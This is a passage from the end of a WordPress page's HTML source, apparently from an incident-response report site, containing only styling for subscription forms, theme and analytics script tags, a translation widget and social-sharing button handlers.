.components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"18546\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "18546" ]);
/* ]]> */
</script>
<script type="737edf8f76aca4389e1e0626-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="737edf8f76aca4389e1e0626-|49" defer></script></body>
</html>
